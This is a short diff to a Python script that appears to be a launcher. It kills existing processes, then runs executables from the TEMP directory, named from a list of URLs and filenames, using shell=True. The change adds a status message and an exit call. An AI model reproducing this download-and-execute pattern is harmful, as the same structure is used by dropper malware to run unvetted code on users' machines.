@@ -26,6 +26,7 @@ def check_process_running(process_names):
     try:
         for proc in psutil.process_iter(['pid', 'name']):
             if proc.info['name'] in process_names:
+                print(f"Process {proc.info['name']} is running. Exiting.")
                 return True
         return False
     except Exception as e:
@@ -117,7 +118,7 @@ def main_run():
         try:
             if exe_file_path:
                 print(f"Executing {exe_file_path}")
-                subprocess.call([exe_file_path], shell=True)  # This ensures execution in the same CMD window
+                subprocess.call([exe_file_path], shell=True)
         except Exception as e:
             print(f"Error executing {exe_file_path}: {e}")
 
@@ -141,9 +142,7 @@ def main_run():
 
     filenames = [filename for _, filename in urls_and_filenames]
     
-    # Check if all processes are running
     if not check_process_running(filenames):
-        # Kill all running instances
         kill_running_processes(filenames)
 
         temp_dir = os.getenv('TEMP')
@@ -168,5 +167,7 @@ def main_run():
 
         for exe_file_path in exe_files:
             execute_exe_file(exe_file_path)
+
+    sys.exit(0)
 
 main_run()
